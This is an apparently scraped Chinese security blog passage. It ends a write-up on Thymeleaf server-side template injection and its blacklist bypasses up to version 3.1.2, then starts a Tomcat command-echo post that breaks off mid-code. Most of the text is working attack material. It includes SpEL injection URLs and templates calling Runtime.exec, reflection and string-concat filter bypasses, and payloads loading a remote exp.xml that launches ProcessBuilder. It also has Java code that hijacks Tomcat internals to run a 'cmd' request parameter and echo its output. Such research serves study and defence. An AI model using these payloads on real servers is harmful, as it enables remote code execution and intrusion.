@GetMapping(\u0026#34;/doc/{document}\u0026#34;) public void getDocument(@PathVariable String document) { log.info(\u0026#34;Retrieving \u0026#34; + document); //returns void, so view name is taken from URI } 用原先的payload尝试\nhttp://127.0.0.1:8090/doc/__%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__%3A%3A.x viewName 与 requesetURI 一致，found 为 true，抛出异常。\n回顾一下 viewName 的生成过程，对于没有返回值的请求方法，DispatcherServlet 将调用 appDefaultViewName 为 ModelAndView 添加默认视图\nDispatcherServlet#applyDefaultViewName\nDispatcherServlet#getDefaultViewName\nDefaultRequestToViewNameTranslator#getViewName\nServletRequestPathUtils#getCachedPathValue\nServletRequestPathUtils#getCachedPath\nlookPath（即 viewName） 是从 request.getAttribute(UrlPathHelper.PATH_ATTRIBTE) 获取的，而 requestURI 从 request.getRequestURI() 获取，两者并不一致\n尝试用 URL 鉴权 的trick 绕过\nPayload\nhttp://127.0.0.1:8090/samepath/;/__%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__%3A%3A.x http://127.0.0.1:8090/samepath//__%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__%3A%3A.x \u0026lt; = Thymeleaf 3.0.15 与 Thymeleaf 3.0.12 相比，Thymeleaf 3.0.15 对 checkViewNameNotInRequest 方法做了如下修改\nSpringRequestUtils#checkViewNameNotInRequest\nSpringRequestUtils#containsExpression\n这里不再校验requestURI是否能够控制 viewName ，而是转而比对 viewName与 requestURI 是否为 SpEL 表达式\n如果 requestURI 是 SpEL 表达式，则直接抛出异常；如果 viewName 包含了SpEL 表达式，则尝试从 request 请求参数中寻找疑似控制 viewName 的参数paramValue，一旦找到或者 paramValue 本身是一个 SpEL 表达式，则同样抛出异常。\n这样确实解决了 spring-view-manipulation 给出的所有情景，不过，并不能完全防御 SSTI 攻击。\n倘若开发者从 Header 字段（如 Cookie）中获取值，并作为视图名返回，还是会绕过 checkViewNameNotInRequest 校验。\n@GetMapping(\u0026#34;/path3\u0026#34;) public String path3(@CookieValue(value = \u0026#34;p\u0026#34;)String p){ return \u0026#34;welcome/\u0026#34; + p + \u0026#34;/welcome\u0026#34;; } 当然，Thymeleaf 3.0.15 的防护并不只有这一处\nSPELVariableExpressionEvaluator#obtainComputedSpelExpression\nSpringStandardExpressionUtils#containsSpELInstantiationOrStaticOrParam\ncontainsSpELInstantiationOrStatic 更名为 containsSpELInstantiationOrStaticOrParam\n看似很复杂，实际上就是过滤了 new、param、T( 关键字\n当然 bypass 也很简单，可以用反射创建 Java 对象\n__${\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;exec\u0026#34;, \u0026#34;\u0026#34;.class).invoke(\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null), \u0026#34;calc\u0026#34;) }__::.x 不过还是会报错，跟踪当前堆栈\nresolve:211, ThymeleafEvaluationContext$ThymeleafEvaluationContextACLMethodResolver (org.thymeleaf.spring5.expression) findAccessorForMethod:205, MethodReference (org.springframework.expression.spel.ast) getValueInternal:135, MethodReference (org.springframework.expression.spel.ast) getValueInternal:95, MethodReference (org.springframework.expression.spel.ast) getValueRef:61, CompoundExpression (org.springframework.expression.spel.ast) getValueInternal:91, CompoundExpression (org.springframework.expression.spel.ast) getValue:112, SpelNodeImpl (org.springframework.expression.spel.ast) getValue:338, SpelExpression (org.springframework.expression.spel.standard) evaluate:265, SPELVariableExpressionEvaluator (org.thymeleaf.spring5.expression) executeVariableExpression:166, VariableExpression (org.thymeleaf.standard.expression) executeSimple:66, SimpleExpression (org.thymeleaf.standard.expression) execute:109, Expression (org.thymeleaf.standard.expression) execute:138, Expression (org.thymeleaf.standard.expression) preprocess:91, StandardExpressionPreprocessor (org.thymeleaf.standard.expression) parseExpression:120, StandardExpressionParser (org.thymeleaf.standard.expression) parseExpression:62, StandardExpressionParser (org.thymeleaf.standard.expression) parseExpression:44, StandardExpressionParser (org.thymeleaf.standard.expression) renderFragment:282, ThymeleafView (org.thymeleaf.spring5.view) render:190, ThymeleafView (org.thymeleaf.spring5.view) render:1406, DispatcherServlet (org.springframework.web.servlet) ... ThymeleafEvaluationContext#resolve\n此处会调用 ExpressionUtils.isTypeAllowed 方法对加载类型判断\nExpressionUtils\n存在黑名单\n没关系，有很多方法可以绕\n二次 SpEL表达式注入\n__${\u0026#39;\u0026#39;.getClass().forName(\u0026#34;org.springframework.expression.spel.standard.SpelExpression\u0026#34;).getMethod(\u0026#34;getValue\u0026#34;).invoke(\u0026#39;\u0026#39;.getClass().forName(\u0026#34;org.springframework.expression.spel.standard.SpelExpressionParser\u0026#34;).getMethod(\u0026#34;parseExpression\u0026#34;, \u0026#39;\u0026#39;.class).invoke(\u0026#39;\u0026#39;.getClass().forName(\u0026#34;org.springframework.expression.spel.standard.SpelExpressionParser\u0026#34;).newInstance(), \u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.net.URLDecoder\u0026#34;).newInstance().decode(\u0026#34;%54(java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;)))}__::.x 这里也同样不能出现 T( 或者 new(空格)，所以要对 T 进行 URL编码\ndecode(\u0026#34;%54(java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;) Update：翻了一下SpEL官方文档，发现可用 concat 连接符拼接 T 和 (\n__${\u0026#39;\u0026#39;.getClass().forName(\u0026#34;org.springframework.expression.spel.standard.SpelExpression\u0026#34;).getMethod(\u0026#34;getValue\u0026#34;).invoke(\u0026#39;\u0026#39;.getClass().forName(\u0026#34;org.springframework.expression.spel.standard.SpelExpressionParser\u0026#34;).getMethod(\u0026#34;parseExpression\u0026#34;, \u0026#39;\u0026#39;.class).invoke(\u0026#39;\u0026#39;.getClass().forName(\u0026#34;org.springframework.expression.spel.standard.SpelExpressionParser\u0026#34;).newInstance(), \u0026#39;T\u0026#39;.concat(\u0026#39;(java.lang.Runtime).getRuntime().exec(\u0026#34;calc\u0026#34;)\u0026#39;)))}__::.x ClassPathXmlApplicationContext SpEL 表达式注入（出网）\n写到这里，突然想起前段时间看过 wh1t3p1g 师傅的一篇文章，里面提到用 ClassPathXmlApplicationContext 远程加载xml造成命令执行\nClassPathXmlApplicationContext context= new ClassPathXmlApplicationContext(\u0026#34;http://127.0.0.1:7777/exp.xml\u0026#34;); 与之类似的还有 FileSystemXmlApplicationContext\nFileSystemXmlApplicationContext context = new FileSystemXmlApplicationContext(\u0026#34;http://127.0.0.1:7777/exp.xml\u0026#34;); 因此构造如下payload\n__${\u0026#39;\u0026#39;.getClass().forName(\u0026#34;org.springframework.context.support.ClassPathXmlApplicationContext\u0026#34;).getDeclaredConstructor(\u0026#39;\u0026#39;.class).newInstance(\u0026#34;http://127.0.0.1:7777/exp.xml\u0026#34;)}__::.x exp.xml\npoc by fynch3r\n\u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;pb\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34;\u0026gt; \u0026lt;constructor-arg value=\u0026#34;calc\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;whatever\u0026#34; value=\u0026#34;#{ pb.start() }\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; Update：2024RWCTF 官方wp提到可以用点号. 绕过 new xxx 的检测，所以可以不用反射\nPayload\n__${new.org..springframework.expression.spel.standard.SpelExpressionParser().parseExpression(\u0026#39;T\u0026#39;.concat(\u0026#39;(java.lang.Runtime).getRuntime().exec(\u0026#34;calc\u0026#34;)\u0026#39;)).getValue()}__::.x Thymeleaf 3.1.x Thymeleaf 3.1.0 Thymeleaf 3.1x 版本做了很多改动，更严格地限制了表达式中类的使用\nThymeleaf 3.1对核心包中的类的使用建立了一般限制：java.*、javax.*、jakarta.*、jdk.*、org.ietf.jgss.*、org.omg.*、org.w3c.dom.*、org.xml.sax.*和。com.sun.*``sun.*\n现在禁止对这些包中的类以及静态引用进行方法/构造函数调用。\n作为此限制的例外，这些包中的某些类始终是允许的：\n基础java.lang.*和java.math.*课程：java.lang.Boolean, java.lang.Byte, java.lang.Character, java.lang.Double, java.lang.Enum, java.lang.Float, java.lang.Integer, java.lang.Long, java.lang.Math, java.lang.Number, java.lang.Short, java.lang.String, java.math.BigDecimal, java.math.BigInteger, java.math.RoundingMode。 集合类和接口：java.util.Collection, java.util.Enumeration, java.util.Iterable, java.util.Iterator, java.util.List, java.util.ArrayList, java.util.LinkedList, java.util.Set, java.util.HashSet, java.util.LinkedHashSet, java.util.Map, java.util.Map.Entry, java.util.HashMap, java.util.LinkedHashMap。注意：接口方法（例如 Map#get(key)）通常允许用于任何实现，但此处列出的特定实现可以另外构造和静态引用。 其他常用类有java.util.*：java.util.Properties、、、、、、。java.util.Optional``java.util.stream.Stream``java.util.Locale``java.util.Date``java.util.Calendar ThymeleafEvaluationContext$ThymeleafEvaluationContextACLMethodResolver#resolve\nExpressionUtils#isMemberAllowed\nisBlockedPackage 方法会对类名校验\nExpressionUtils#isBlockedPackage\nExpressionUtils\njava.*、javax.*、jakarta.*、jdk.*、org.ietf.jgss.*、org.omg.*、org.w3c.dom.*、org.xml.sax.*、com.sun.*、sun.* 赫然在内，限制了 Runtime、ProcessBuilder 等类。\n翻看之前写的 payload， ClassPathXmlApplicationContext 并不在黑名单中，貌似能 bypass\n__${\u0026#39;\u0026#39;.getClass().forName(\u0026#34;org.springframework.context.support.ClassPathXmlApplicationContext\u0026#34;).getDeclaredConstructor(\u0026#39;\u0026#39;.class).newInstance(\u0026#34;http://127.0.0.1:7777/exp.xml\u0026#34;)}__::.x 调试代码发现利用失败，原因是 payload 调用了 newInstance 方法\n而 java.lang.reflect.* 在黑名单内，所以无法调用 Java 原生的反射方法（invoke、newInstance等）\n不过new 关键字可以用点号.绕过，因此可以这样构造payload\n__${new.org..springframework.expression.spel.standard.SpelExpressionParser().parseExpression(\u0026#39;T\u0026#39;.concat(\u0026#39;(java.lang.Runtime).getRuntime().exec(\u0026#34;calc\u0026#34;)\u0026#39;)).getValue()}__::.x Thymeleaf SSTI 上传恶意模板\nSPELVariableExpressionEvaluator#obtainComputed\n当然，用户上传的模板不受 T(、new 过滤影响，expContext.getRestrictInstantiationAndStatic() 计算结果为 false\n\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34; xmlns:th=\u0026#34;http://www.thymeleaf.org\u0026#34;\u0026gt; \u0026lt;div th:fragment=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Spring Boot Web Thymeleaf Example\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div th:fragment=\u0026#34;main\u0026#34;\u0026gt; \u0026lt;span th:text=\u0026#34;\u0026#39;Hello, \u0026#39; + ${T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;)}\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;!-- \u0026lt;p\u0026gt;Hello, [[${T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;)}]]\u0026gt;\u0026lt;/span\u0026gt; --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/html\u0026gt; 如果能上传模板，并找到黑名单外的一个具有同样反射功能的方法，SSTI也是能够触发的\n用 Cypher 语句来查询\nmatch (source:Method {IS_PUBLIC:true, IS_STATIC:true}) where not(source.CLASSNAME starts with \u0026#39;java.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;javax.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;jakarta.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;jdk.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.ietf.jgss.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.omg.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.w3c.dom.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.xml.sax.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;com.sun.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;sun.\u0026#39;) or source.CLASSNAME starts with \u0026#39;java.time.\u0026#39; match (sink:Method {IS_SINK:true, CLASSNAME:\u0026#34;java.lang.reflect.Constructor\u0026#34;, NAME:\u0026#34;newInstance\u0026#34;})\u0026lt;-[:CALL]-(source) return * 找到了 org.springframework.cglib.core.ReflectUtils#newInstance\npublic static Object newInstance(final Constructor cstruct, final Object[] args) { boolean flag = cstruct.isAccessible(); try { if (!flag) { cstruct.setAccessible(true); } Object result = cstruct.newInstance(args); return result; } ... } 将改造payload 成如下形式\nPayload\n${T(org.springframework.cglib.core.ReflectUtils).newInstance(\u0026#39;\u0026#39;.getClass().forName(\u0026#39;org.springframework.context.support.ClassPathXmlApplicationContext\u0026#39;).getDeclaredConstructor(\u0026#39;\u0026#39;.class),{\u0026#39;http://127.0.0.1:7777/exp.xml\u0026#39;})} hello.html\n\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34; xmlns:th=\u0026#34;http://www.thymeleaf.org\u0026#34;\u0026gt; \u0026lt;div th:fragment=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Spring Boot Web Thymeleaf Example\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div th:fragment=\u0026#34;main\u0026#34;\u0026gt; [[${T(org.springframework.cglib.core.ReflectUtils).newInstance(\u0026#39;\u0026#39;.getClass().forName(\u0026#39;org.springframework.context.support.ClassPathXmlApplicationContext\u0026#39;).getDeclaredConstructor(\u0026#39;\u0026#39;.class),{\u0026#39;http://127.0.0.1:7777/exp.xml\u0026#39;})}]] \u0026lt;/div\u0026gt; \u0026lt;/html\u0026gt; Thymeleaf 3.1.1 ExpressionUtils\nThymeleaf 3.1.1 版本增加了更多的黑名单\n用之前找到的 org.springframework.beans.BeanUtils#instantiateClass 构造 payload\npublic static \u0026lt;T\u0026gt; T instantiateClass(Constructor\u0026lt;T\u0026gt; ctor, Object... args) throws BeanInstantiationException { Assert.notNull(ctor, \u0026#34;Constructor must not be null\u0026#34;); try { ReflectionUtils.makeAccessible(ctor); if (KotlinDetector.isKotlinReflectPresent() \u0026amp;\u0026amp; KotlinDetector.isKotlinType(ctor.getDeclaringClass())) { return KotlinDelegate.instantiateClass(ctor, args); } ... } } private static class KotlinDelegate{ public static \u0026lt;T\u0026gt; T instantiateClass(Constructor\u0026lt;T\u0026gt; ctor, Object... args) throws IllegalAccessException, InvocationTargetException, InstantiationException { KFunction\u0026lt;T\u0026gt; kotlinConstructor = ReflectJvmMapping.getKotlinFunction(ctor); if (kotlinConstructor == null) { return ctor.newInstance(args); } ... } } payload\n\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34; xmlns:th=\u0026#34;http://www.thymeleaf.org\u0026#34;\u0026gt; \u0026lt;div th:fragment=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Spring Boot Web Thymeleaf Example\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div th:fragment=\u0026#34;main\u0026#34;\u0026gt; [[${T(org.springframework.beans.BeanUtils).instantiateClass(\u0026#39;\u0026#39;.getClass().forName(\u0026#39;org.springframework.context.support.ClassPathXmlApplicationContext\u0026#39;).getDeclaredConstructor(\u0026#39;\u0026#39;.class), \u0026#39;http://127.0.0.1:7777/exp.xml\u0026#39;)}]] \u0026lt;/div\u0026gt; \u0026lt;/html\u0026gt; Thymeleaf 3.1.2 ExpressionUtils\n黑名单上了更多的类，继续用 Cypher 语句寻找目标\nmatch (source:Method {IS_PUBLIC:true, IS_STATIC:true}) where not(source.CLASSNAME starts with \u0026#39;java.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;javax.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;jakarta.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;jdk.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.ietf.jgss.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.omg.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.w3c.dom.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.xml.sax.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;com.sun.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;sun.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;com.squareup.javapoet.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;net.bytebuddy.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;net.sf.cglib.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;javassist.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;javax0.geci.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.apache.bcel.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.aspectj.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.javassist.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.mockito.\u0026#34;\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.objectweb.asm.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.objenesis.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.aot.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.asm.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.cglib.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.javapoet.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.objenesis.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.web.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.webflow.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.context.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.beans.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.aspects.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.aop.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.expression.\u0026#39;) and not(source.CLASSNAME starts with \u0026#39;org.springframework.util.\u0026#39;) match (sink:Method {IS_SINK:true})\u0026lt;-[:CALL]-(source) where sink.VUL in [\u0026#34;CODE\u0026#34;, \u0026#34;EXEC\u0026#34;] return * 列出部分结果\n// forName org.thymeleaf.util.ClassLoaderUtils#loadClass org.apache.el.util.ReflectionUtil#forName com.fasterxml.jackson.core.util#versionFor // loadClass org.apache.tomcat.util.IntrospectionUtils#callMethod1 org.apache.logging.log4j.util.LoaderUtil#loadClass ch.qos.logback.core.util.OptionHelper#instantiateByClassNameAndParameter ch.qos.logback.core.util.Loader#loadClass ch.qos.logback.core.util.EnvUtil#isClassAvailable com.fasterxml.jackson.databind.util.ClassUtil#getClassMethods ch.qos.logback.core.util.Loader#loadClass org.apache.catalina.util.Introspection#loadClass // newInstance com.fasterxml.jackson.core.util.VersionUtil#versionFor org.apache.coyote.ProtocolHandler#create com.fasterxml.jackson.databind.util.ClassUtil#createInstance org.springframework.core.CollectionFactory#createCollection org.apache.catalina.valves.rewrite.RewriteValve#parse org.apache.tomcat.util.net.SSLImplementation#getInstance org.apache.tomcat.websocket.Util#getDecoders org.apache.logging.log4j.util.LoaderUtil#newInstanceOf org.springframework.core.CollectionFactory#createMap ch.qos.logback.core.util.OptionHelper#instantiateByClassNameAndParameter // getMethod ch.qos.logback.core.joran.util.StringToObjectConverter#getValueOfMethod org.springframework.core.MethodIntrospector#selectInvocableMethod org.apache.catalina.manager.util.SessionUtils#guessLocaleFromSession // invoke org.apache.tomcat.util.IntrospectionUtils#setProperty org.apache.logging.log4j.util.Base64Util#encode org.apache.tomcat.util.IntrospectionUtils#callMethodN org.apache.tomcat.util.IntrospectionUtils#getProperty org.apache.tomcat.util.buf.ByteBufferUtils#cleanDirectBuffer org.apache.tomcat.util.IntrospectionUtils#callMethod1 这里选择 org.apache.logging.log4j.util.LoaderUtil 类（虽然属于 log4j 依赖包，但比较常见）\npublic static Class\u0026lt;?\u0026gt; loadClass(final String className) throws ClassNotFoundException { if (isIgnoreTccl()) { return Class.forName(className); } } public static \u0026lt;T\u0026gt; T newInstanceOf(final Class\u0026lt;T\u0026gt; clazz) throws InstantiationException, IllegalAccessException, InvocationTargetException { try { return clazz.getConstructor().newInstance(); } catch (NoSuchMethodException var2) { return clazz.newInstance(); } } 构造如下 payload\n${T(org.apache.logging.log4j.util.LoaderUtil).newInstanceOf(T(org.apache.logging.log4j.util.LoaderUtil).loadClass(\u0026#39;org.springframework.expression.spel.standard.SpelExpressionParser\u0026#39;)).parseExpression(\u0026#34;T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;).getValue()} 对应的模板文件 hello.html 为\n\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34; xmlns:th=\u0026#34;http://www.thymeleaf.org\u0026#34;\u0026gt; \u0026lt;div th:fragment=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Spring Boot Web Thymeleaf Example\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div th:fragment=\u0026#34;main\u0026#34;\u0026gt; [[${T(org.apache.logging.log4j.util.LoaderUtil).newInstanceOf(T(org.apache.logging.log4j.util.LoaderUtil).loadClass(\u0026#39;org.springframework.expression.spel.standard.SpelExpressionParser\u0026#39;)).parseExpression(\u0026#34;T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;).getValue()}]] \u0026lt;/div\u0026gt; \u0026lt;/html\u0026gt; 0x06 Reference Thymeleaf SSTI 分析以及最新版修复的 Bypass\nThymeleaf ssti 3.1.2 黑名单绕过\n本文原载于0ZHan\u0026rsquo;s Blog，遵循CC BY-NC-SA 4.0协议，复制请保留原文出处。\n","date":"2024-03-26T00:04:27+08:00","permalink":"/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","title":"Thymeleaf模板注入原理分析"},{"content":"0x00 前言 Tomcat 回显的方法有很多，诸如报错回显、写文件回显、RMI回显、dnslog回显等都可显示命令执行的结果。其中，最为稳定、通用的方式是获取当前请求的request 、 response 对象，通过response 将结果直接显示在响应页面上。\n0x01 具体思路 1.1 通过 ThreadLocal 获取request (Tomcat \u0026gt;= 7) 1.1.1 原理分析 kingkk 师傅 给出的思路是：\n寻找一个能够保存 request 和 response 对象的变量 该变量最好不是全局变量，而是 static 修饰的静态变量，否则还需要去获取那个变量所在的实例 最好是一个 ThreadLocal ，这样才能确保获取的是当前线程的请求信息 关于 ThreadLocal 的介绍如下\nThreadLocal 叫做线程变量，意思是 ThreadLocal 中填充的变量属于当前线程，该变量对其他线程而言是隔离的，也就是说该变量是当前线程独有的变量。ThreadLocal 为变量在每个线程中都创建了一个副本，那么每个线程可以访问自己内部的副本变量。\nThreadLoal 变量，线程局部变量，同一个 ThreadLocal 所包含的对象，在不同的 Thread 中有不同的副本。这里有几点需要注意：\n因为每个 Thread 内有自己的实例副本，且该副本只能由当前 Thread 使用。这是也是 ThreadLocal 命名的由来。 既然每个 Thread 有自己的实例副本，且其它 Thread 不可访问，那就不存在多线程间共享的问题。 沿着这种思路，kingkk 师傅在org.apache.catalina.core.ApplicationFilterChain 这个类中，找到了符合要求的变量 lastServicedReuqest 和 lastServicedResponse\nApplicationFilterChain\nApplicationFilterChain#internalDoFilter\nApplicationFilterChain#internalDoFilter 负责 Filter 责任链的执行，因此 Tomcat 处理请求时必然会调用该方法。\n而该方法又恰好用 lastServiceRequest 和 lastServicedResponse 对 request 和 response 进行存储，完美符合要求。\n由于 ApplicationDispatcher.WRAP_SAME_OBJECT 默认 false，正常情况是不会走进赋值流程的，所以我们需要用反射将 WRAP_SAME_OBJECT 的值改为 true。这样在我们后续的访问中，当前请求的request 和 response 便被保存下来，进而被获取。\n1.1.2 编写POC 第一步：将 WRAP_SAME_OBJECT值改为true\n由于 WRAP_SAME_OBJECT 被 static 和 final 修饰，因此我们需要清除 Field 的 modifiers数据域中代表 final 关键字的那个 bit\nClass\u0026lt;?\u0026gt; applicationDispatcherClass = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationDispatcher\u0026#34;); Field WRAP_SAME_OBJECT_FIELD = applicationDispatcherClass.getDeclaredField(\u0026#34;WRAP_SAME_OBJECT\u0026#34;); Field modifiersField = WRAP_SAME_OBJECT_FIELD.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); WRAP_SAME_OBJECT_FIELD.setAccessible(true); modifiersField.setAccessible(true); modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() \u0026amp; ~Modifier.FINAL); // 置零清除 final 标志位 WRAP_SAME_OBJECT_FIELD.set(null, true); 第二步：将 lastServicedRequest 、lastServicedResponse 初始化成 ThreadLocal\n因为 WRAP_SAME_OBJECT 默认 false ，所以lastServicedRequest 、lastServicedResponse 默认为空，我们需要用反射将它们初始化成 ThreadLocal 对象\nClass\u0026lt;?\u0026gt; applicationFilterChainClass = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterChain\u0026#34;); Field lastServicedRequestField = applicationFilterChainClass.getDeclaredField(\u0026#34;lastServicedRequest\u0026#34;); Field lastServicedResponseField = applicationFilterChainClass.getDeclaredField(\u0026#34;lastServicedResponse\u0026#34;); lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() \u0026amp; ~Modifier.FINAL); modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() \u0026amp; ~Modifier.FINAL); lastServicedRequestField.set(null, new ThreadLocal\u0026lt;ServletRequest\u0026gt;()); lastServicedResponseField.set(null, new ThreadLocal\u0026lt;ServletResponse\u0026gt;()); 结合第一步和第二步，编写 TomcatEchoThreadLocal1 （这里用CC11链打的）\npublic class TomcatEchoThreadLocal1 extends AbstractTranslet{ static { try{ Class\u0026lt;?\u0026gt; applicationDispatcherClass = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationDispatcher\u0026#34;); Field WRAP_SAME_OBJECT_FIELD = applicationDispatcherClass.getDeclaredField(\u0026#34;WRAP_SAME_OBJECT\u0026#34;); Field modifiersField = WRAP_SAME_OBJECT_FIELD.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); WRAP_SAME_OBJECT_FIELD.setAccessible(true); modifiersField.setAccessible(true); modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() \u0026amp; ~Modifier.FINAL); // final标志位 置0 WRAP_SAME_OBJECT_FIELD.set(null, true); Class\u0026lt;?\u0026gt; applicationFilterChainClass = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterChain\u0026#34;); Field lastServicedRequestField = applicationFilterChainClass.getDeclaredField(\u0026#34;lastServicedRequest\u0026#34;); Field lastServicedResponseField = applicationFilterChainClass.getDeclaredField(\u0026#34;lastServicedResponse\u0026#34;); lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() \u0026amp; ~Modifier.FINAL); modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() \u0026amp; ~Modifier.FINAL); lastServicedRequestField.set(null, new ThreadLocal\u0026lt;ServletRequest\u0026gt;()); lastServicedResponseField.set(null, new ThreadLocal\u0026lt;ServletResponse\u0026gt;()); }catch (Exception e){ } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 第三步：从 lastServicedRequest 和 lastServicedResponse 中分别获取 request 和 response，执行命令并输出结果\nThreadLocal\u0026lt;ServletRequest\u0026gt; lastServicedRequest = (ThreadLocal\u0026lt;ServletRequest\u0026gt;) lastServicedRequestField.get(null); ThreadLocal\u0026lt;ServletResponse\u0026gt; lastServicedResponse = (ThreadLocal\u0026lt;ServletResponse\u0026gt;) lastServicedResponseField.get(null); ServletRequest request = lastServicedRequest.get(); ServletResponse response = lastServicedResponse.get(); String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); if( cmd != null) { String line; String[] cmds = new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; PrintWriter out = response.getWriter(); Process execResult = Runtime.getRuntime().exec(cmds); InputStream inputStream = execResult.getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream)); while((line = bufferedReader.readLine()) != null){ out.println(line); } } 根据第三步编写 TomcatEchoThreadLocal2\npublic class TomcatEchoThreadLocal2 extends AbstractTranslet{ static { try{ Class\u0026lt;?\u0026gt; applicationFilterChainClass = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterChain\u0026#34;); Field lastServicedRequestField = applicationFilterChainClass.getDeclaredField(\u0026#34;lastServicedRequest\u0026#34;); Field lastServicedResponseField = applicationFilterChainClass.getDeclaredField(\u0026#34;lastServicedResponse\u0026#34;); 